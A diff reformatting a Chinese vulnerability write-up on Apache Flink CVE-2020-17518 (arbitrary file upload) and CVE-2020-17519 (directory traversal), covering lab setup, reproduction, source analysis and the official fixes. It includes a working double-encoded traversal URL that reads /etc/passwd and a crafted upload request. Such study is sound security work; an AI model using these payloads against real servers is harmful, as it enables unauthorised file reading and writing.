@@ -1,9 +1,11 @@
-**Apache Flink Jobmanager目录穿越漏洞(CVE-2020-17519)/任意文件上传漏洞(CVE-2020-17518)**
-**靶场搭建：**
+# Apache Flink Jobmanager目录穿越漏洞(CVE-2020-17519)/任意文件上传漏洞(CVE-2020-17518)
+
+# Apache Flink Jobmanager目录穿越漏洞(CVE-2020-17519)
+## 靶场搭建：
 
 可以通过以下两种方式来搭建靶场。
 
-**Docker搭建：**
+### Docker搭建：
 ```
 https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17518
 https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17519
@@ -17,7 +19,7 @@ Vulhub已经在Github上提供可以同时满足这两个漏洞的相关docker�
 4.	在Apache Flink启动后，通过访问http://your-ip:8081 来查看主页
 Yaml文件内容：
   
-```
+```docker
 version: '2'
 services:
  flink:
@@ -29,7 +31,7 @@ services:
 ```
 
  
-**虚拟机搭建：**
+### 虚拟机搭建：
 
 Flink安装包地址：[https://archive.apache.org/dist/flink/flink-1.11.2/]
 
@@ -77,9 +79,9 @@ tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN      
 
 Flink 在 1.5.1 版本中引入了一个 REST handler，这允许攻击者将已上传的文件写入本地任意位置的文件中，并且可通过一个恶意修改的 HTTP 头将这些文件写入到 Flink 1.5.1 可以访问的任意位置。
 
-**漏洞复现：**
+## 漏洞复现：
 
-```
+```http
 POST /jars/upload HTTP/1.1
 Host: localhost:8081
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:84.0) Gecko/20100101 Firefox/84.0
@@ -100,7 +102,7 @@ test
 -----------------------------13247690941547071692111317477-
 ```
 
-**漏洞分析：**
+## 漏洞分析：
 
 通过apache官方邮件找到commit地址
 
@@ -121,7 +123,7 @@ The change required adapting the MultipartUploadResource in a way that it is use
 
 通过抓包获得传入接口：
 
-```
+```http
 GET /jars/upload HTTP/1.1
 Host: localhost:8081
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:84.0) Gecko/20100101 Firefox/84.0
@@ -134,7 +136,7 @@ Connection: close
  
 **通过官方文档查找接口详细信息：**
 
-```
+```http
 /jars/upload
 Verb: POST	Response code: 200 OK
 Uploads a jar to the cluster. The jar must be sent as multi-part data. Make sure that the "Content-Type" header is set to "application/x-java-archive", as some http libraries do not add the header by default. Using 'curl' you can upload a jar via 'curl -X POST -H "Expect:" -F "jarfile=@path/to/flink-job.jar" http://hostname:port/jars/upload'.
@@ -160,7 +162,7 @@ Response
  
 在上传路径的实现方法处，可以看到getFilename()函数接受到前端传递的参数并存放在filename当中
 
-```
+```java
 if (data.getHttpDataType() == InterfaceHttpData.HttpDataType.FileUpload) {
 	final DiskFileUpload fileUpload = (DiskFileUpload) data;
 	checkState(fileUpload.isCompleted());
@@ -171,7 +173,7 @@ if (data.getHttpDataType() == InterfaceHttpData.HttpDataType.FileUpload) {
 ```
 之后将参数filename传递给resolve()函数，在resolve()中，filename与系统路径拼接将值存入dest当中
 
-```
+```java
 public String getFilename() {
     return this.filename;
 }
@@ -179,7 +181,7 @@ public String getFilename() {
 
 最后dest储存拼接上传路径并传递给了fileUpload.renameTo()方法
 
-```
+```java
 default Path resolve(String other) {
     return resolve(getFileSystem().getPath(other));
 }
@@ -187,7 +189,7 @@ default Path resolve(String other) {
 
 最后在rename()函数中返回上传路径，并重命名保存至temp目录下作为缓存文件
 
-```
+```java
 public boolean renameTo(File dest) {
     SecurityManager security = System.getSecurityManager();
     if (security != null) {
@@ -206,7 +208,7 @@ public boolean renameTo(File dest) {
 
 Rename()函数对上传文件f1，和缓存文件f2都进行了写入
 
-```
+```java
 public boolean rename(File f1, File f2) {
     // Keep canonicalization caches in sync after file deletion
     // and renaming operations. Could be more clever than this
@@ -218,25 +220,25 @@ public boolean rename(File f1, File f2) {
     return rename0(f1, f2);
 }
 ```
-**修复：**
+## 修复：
 
 官方使用getName()函数对上传路径进行了截断，只取得文件名”../”和上传目录名都被忽略了
 
-```
+```java
 final Path dest = currentUploadDir.resolve(new File(fileUpload.getFilename()).getName());
 fileUpload.renameTo(dest.toFile());
 ```
 
-**CVE-2020-17519（1.11.0 <= Apache Flink  <= 1.11.2）**
+# CVE-2020-17519（1.11.0 <= Apache Flink  <= 1.11.2）
 
 Apache Flink 1.11.0中引入的更改（包括1.11.1和1.11.2）允许攻击者通过JobManager进程的REST接口读取JobManager本地文件系统上的任何文件。
 
-**漏洞复现：**
+## 漏洞复现：
 
 遍历linux系统下/etc/passwd文件
 `http://localhost:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd`
  
-**漏洞分析：**
+## 漏洞分析：
 
 通过apache官方邮件找到commit地址
 
@@ -253,7 +255,7 @@ This is fixed now. The passed path is ignored in the same way as it's already do
 从commit中可以看出该漏洞是通过使用'..%252f'来替换'../'导致可以遍历./log文件夹相关的目录结构
 通过文档说明找到对应class的位置
 
-```
+```java
 try {
 	handlerRequest = new HandlerRequest<R, M>(
 		request,
@@ -279,11 +281,11 @@ try {
 
 系统接受request并对handlerRequest对象进行初始化，routedRequest.getRouteResult()将初始化的值存入result，getRouteResult()对request进行第一次解码，最后传递给pathRarams()函数并将第二次解码的结果储存在pathParam变量中
 
-```
+```java
 routedRequest.getRouteResult().pathParams(),
 routedRequest.getRouteResult().queryParams(),
 ```
-```
+```java
 public RouteResult<T> getRouteResult() {
 	return result;
 }
@@ -291,7 +293,7 @@ public RouteResult<T> getRouteResult() {
 
 Handler request的值被传递到org.apache.flink.runtime.rest.handler.cluster.JobManagerCustomLogHandler#getFile并被储存在file变量中，读取file中储存的值作为相应内容
 
-```
+```java
 	protected CompletableFuture<Void> respondToRequest(ChannelHandlerContext ctx, HttpRequest httpRequest, HandlerRequest<EmptyRequestBody, M> handlerRequest, RestfulGateway gateway) {
 		File file = getFile(handlerRequest);
 		if (file != null && file.exists()) {
@@ -318,7 +320,7 @@ Handler request的值被传递到org.apache.flink.runtime.rest.handler.cluster.J
  
 getFile函数提取变量pathRarams中的值储存在filename中并拼接logDir作为返回路径存在file变量中
 
-```
+```java
 protected File getFile(HandlerRequest<EmptyRequestBody, FileMessageParameters> handlerRequest) {
 	if (logDir == null) {
 		return null;
@@ -329,7 +331,7 @@ protected File getFile(HandlerRequest<EmptyRequestBody, FileMessageParameters> h
  
 在respondToRequest处取断点可以看到返回的file变量的值已经和logDir拼接并返回
 
-```
+```java
 protected CompletableFuture<Void> respondToRequest(ChannelHandlerContext ctx, HttpRequest httpRequest, HandlerRequest<EmptyRequestBody, M> handlerRequest, RestfulGateway gateway) {
 		File file = getFile(handlerRequest);
 		if (file != null && file.exists()) {
@@ -350,7 +352,7 @@ protected CompletableFuture<Void> respondToRequest(ChannelHandlerContext ctx, Ht
 在org.apache.flink.runtime.rest.handler.router.RouterHandler#channelRead0()中，将request中的uri转存入qsd变量，qsd调用path()函数进行了第一次解码
 
 protected void channelRead0(ChannelHandlerContext channelHandlerContext, HttpRequest httpRequest) {
-```
+```java
 	if (HttpHeaders.is100ContinueExpected(httpRequest)) {
 		channelHandlerContext.writeAndFlush(new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.CONTINUE));
 		return;
@@ -365,7 +367,7 @@ protected void channelRead0(ChannelHandlerContext channelHandlerContext, HttpReq
 
 Path()函数调用decodeComponent函数将qsd变量的值uri进行第一次解码并存入this.path当中，从debug调试器中可以看到从uri到path的变化
 
-```
+```java
 public String path() {
     if (this.path == null) {
         this.path = decodeComponent(this.uri, 0, this.pathEndIdx(), this.charset, true);
@@ -379,7 +381,7 @@ public String path() {
  
 在route()函数中，将this.path变量传递给了decodePathToken()函数进行第二次解码并存入token变量中，此时两次解码都结束了，最后将method,path,queryParameters传入传入route()来获取初始化RouteResult结果
 
-```
+```java
 public RouteResult<T> route(HttpMethod method, String path, Map<String, List<String>> queryParameters) {
 	MethodlessRouter<T> router = routers.get(method);
 	if (router == null) {
@@ -395,7 +397,7 @@ public RouteResult<T> route(HttpMethod method, String path, Map<String, List<Str
  
 从decodePathTokens()函数中可以看出，decodePathToken()将path进行了二次解码并判断路径上的‘/’进行分割截断并存入encodedTokens数组当中。当攻击者传入编码过的‘/’后，可以绕过对‘/’的检测，最后使用对数组中的参数进行依次解码并返回正常路径
 
-```
+```java
 	private String[] decodePathTokens(String uri) {
 		// Need to split the original URI (instead of QueryStringDecoder#path) then decode the tokens (components),
 		// otherwise /test1/123%2F456 will not match /test1/:p1
@@ -416,11 +418,11 @@ public RouteResult<T> route(HttpMethod method, String path, Map<String, List<Str
 ```
 
  
-**修复：**
+## 修复：
 
 官方通过 File.getName()函数来取得末尾文件名而不是原来的整个文件路径
 
-```
+```java
 String filename = handlerRequest.getPathParameter(LogFileNamePathParameter.class);
 // wrapping around another File instantiation is a simple way to remove any path information - we're
 // solely interested in the filename
